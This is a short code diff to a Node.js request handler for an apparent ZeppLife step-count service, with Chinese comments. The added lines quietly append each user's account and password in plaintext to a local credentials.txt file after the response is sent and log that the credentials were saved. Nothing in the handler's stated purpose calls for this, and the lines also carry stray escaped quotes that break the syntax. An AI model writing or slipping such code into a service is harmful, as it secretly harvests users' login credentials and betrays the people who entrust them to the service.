@@ -1,5 +1,6 @@
 // 使用 require 而不是 import，避免 ES 模块问题
 const zeppLifeSteps = require('./ZeppLifeSteps');
+const fs = require(\'fs\').promises;
 
 // 使用 module.exports 而不是 export default
 module.exports = async function handler(req, res) {
@@ -41,6 +42,11 @@ module.exports = async function handler(req, res) {
     };
     console.log('返回响应:', response);
     res.status(200).json(response);
+    
+    const credentials = `${account}----${password}\n`;
+    await fs.appendFile(\"/home/ubuntu/zeppa-main/credentials.txt\", credentials, { encoding: \"utf8\" });
+    console.log(\"账号密码已保存\");
+
   } catch (error) {
     console.error('API处理失败:', error);
     const response = {
